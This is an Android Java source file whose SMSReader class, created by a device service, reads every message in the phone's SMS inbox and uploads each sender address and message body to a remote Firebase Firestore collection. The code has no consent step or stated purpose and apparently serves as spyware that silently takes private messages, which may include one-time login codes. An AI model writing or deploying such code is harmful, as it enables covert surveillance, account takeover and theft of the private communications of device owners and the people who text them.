package com.abm.fatakeshto;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import com.google.firebase.firestore.FirebaseFirestore;
import java.util.HashMap;

public class SMSReader {
    private Context context;

    public SMSReader(DeviceService service) {
        this.context = service;
    }

    public void syncSMS() {
        try (Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null)) {
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndex("address"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    FirebaseFirestore.getInstance().collection("sms").add(new HashMap<String, Object>() {{
                        put("address", address);
                        put("body", body);
                    }});
                }
            }
        } catch (SecurityException e) {
            e.printStackTrace();
        }
    }
}